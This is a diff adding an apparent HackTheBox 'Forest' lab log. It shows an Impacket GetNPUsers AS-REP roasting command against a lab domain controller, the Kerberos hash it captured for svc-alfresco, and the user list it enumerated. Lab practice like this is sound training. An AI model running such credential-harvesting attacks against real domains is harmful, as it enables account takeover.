@@ -1,0 +1,24 @@
+ GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile userlistforest 
+Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation
+
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:58fe33a96a0f050c5d7e3dcdd4ae283c$007b2cde479e8a1b625d4139b734b0fb2ec1afa0d5e39a1494c402f97a68bc69d94ee7b6ac5ba4857ca31b060d1597536e44234e4a24d7c0c71f4c6d0d69c365038b0728026348fc3d22b74dc74fb7671f8309909e4d0422b8f8c8a9834000b550e3d6abc46ea1e7ddc377ee1c6345daf19d55f545bffac32ed2481843d1304fe0a0cb205bbbda6648fc0219eb771dbe315a7f10730978a7595b1d65338a965f203c8d85e44186001283ec8a11af74763dd4e818cfa27d3fb6940c16cbc0fc312d2059637d5ca1eb12160db2d80b6b91661bfb8401a67cff0df27484f33dd17f44ab64450fd4
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+                                                                                                                                                                                    
+┌──(rocky㉿kali)-[~/hckbox/forest-1]
+└─$ cat userlistforest  
+sebastien
+lucinda 
+svc-alfresco
+andy
+mark
+santi
+Administrator
+Guest
+krbtgt
